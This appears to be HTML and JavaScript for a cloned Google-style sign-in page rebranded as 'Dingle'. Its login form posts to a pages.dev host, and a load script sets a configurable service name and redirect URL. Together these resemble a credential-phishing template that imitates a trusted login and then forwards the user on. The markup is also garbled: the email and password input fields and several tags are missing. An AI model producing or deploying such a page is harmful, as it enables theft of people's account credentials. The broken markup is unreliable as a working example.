    <body>
        <div class="wrapper">
            <div class="google-header-bar">

                    <img class="logo" src="https://dingle-accs.pages.dev/logo.png" alt="Dingle">
                    </span>

            <div class="main content clearfix">
                <div class="sign-in">
                    <div class="signin-box">
                        <h2>
                            Sign in <strong></strong>
                        </h2>
                        <form novalidate id="gaia_loginform" action="https://dingle-accs.pages.dev/ServiceLoginAuth" method="post">
                            <input type="hidden" name="dsh" id="dsh" value="-9168345935043891883">
                            <input type="hidden" name="GALX" value="ezY0Qw_BP6w">
                            <input type="hidden" name="timeStmp" id="timeStmp" value=''/>
                            <input type="hidden" name="secTok" id="secTok" value=''/>
                            <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
                            <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
                            <div class="email-div">
                                <label for="Email">
                                    <strong class="email-label">Email</strong>

                            <div class="passwd-div">

  Stay signed in

                <div class="product-info ">

                    </div>
                    <p><b id="servicename">Unknown</b> supports a Dingle Account.</p>
                </div>
            </div>
            <script type="text/javascript">
            </script>

            <script type="text/javascript">
                var gaia_hasInnerTextProperty = document.getElementsByTagName("body")[0].innerText != undefined ? true : false;
                var gaia_attachEvent = function(element, event, callback) {
                    if (element.addEventListener) {
                        element.addEventListener(event, callback, false);
                    } else if (element.attachEvent) {
                        element.attachEvent('on' + event, callback);
                    }
                };
                var gaia_getElementsByClass = function(className) {
                    if (document.getElementsByClassName) {
                        return document.getElementsByClassName(className);
                    } else if (document.querySelectorAll && document.querySelectorAll('.' + className)) {
                        return document.querySelectorAll('.' + className);
                    }
                    return [];
                };
                function gaia_parseFragment() {
                    var hash = location.hash;
                    var params = {};
                    if (!hash) {
                        return params;
                    }
                    var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
                    for (var i = 0; i < paramStrs.length; i++) {
                        var param = paramStrs[i].split('=');
                        params[param[0]] = param[1];
                    }
                    return params;
                }

                function gaia_prefillEmail() {
                    var f = null;
                    if (document.getElementById) {
                        f = document.getElementById('gaia_loginform');
                    }

                    if (f && f.Email && (f.Email.value == null || f.Email.value == '') && (f.Email.type != 'hidden')) {
                        hashParams = gaia_parseFragment();
                        if (hashParams['Email'] && hashParams['Email'] != '') {
                            f.Email.value = hashParams['Email'];
                        }
                    }
                }

                try {
                    gaia_prefillEmail();
                } catch (e) {}

                function gaia_setFocus() {

                    var f = null;
                    if (document.getElementById) {
                        f = document.getElementById('gaia_loginform');
                    }
                    if (f) {
                        var agt = navigator.userAgent.toLowerCase();
                        var is_ie = (agt.indexOf("msie") != -1);
                        if (f.Email && (f.Email.value == null || f.Email.value == '' || is_ie) && (f.Email.type != 'hidden') && f.Email.focus) {
                            f.Email.focus();
                            if (f.Email.value) {

                                f.Email.value = f.Email.value;
                            }
                        } else if (f.Passwd) {
                            f.Passwd.focus();
                        }
                    }

                }
                window.onload = gaia_setFocus;

                function gaia_onLoginSubmit() {

                    if (window.gaiacb_onLoginSubmit) {
                        gaiacb_onLoginSubmit();
                    }

                    try {
                        document.bg.invoke(function(response) {
                            document.getElementById('bgresponse').value = response;
                        });
                    } catch (err) {}

                    return true;
                }
                document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;

                gaia_appendParam = function(url, name, value) {
                    var param = encodeURIComponent(name) + '=' + encodeURIComponent(value);
                    if (url.indexOf('?') >= 0) {
                        return url + '&' + param;
                    } else {
                        return url + '?' + param;
                    }
                }
                ;
                var langChooser = document.getElementById('lang-chooser');
                var langChooserWrap = document.getElementById('lang-chooser-wrap');
                if (langChooser && langChooserWrap) {
                    var langChooserParam = 'hl';
                    var langChooserUrl = '\x2FServiceLogin?lp=1';
                    langChooserWrap.style.display = '';
                    langChooser.onchange = function() {
                        window.location.href = gaia_appendParam(langChooserUrl, langChooserParam, this.value);
                    }
                    ;
                }

window.addEventListener("load", function () {
    document.getElementById("servicename").innerText =
        window.config.servicename || "Unknown";

    document.getElementById("gaia_loginform").action =
        "https://dingle-accs.pages.dev/ServiceLoginAuth?redirect=" +
        (window.config.serviceurl || "https://example.com/");
});
            </script>
        </div>
    </body>
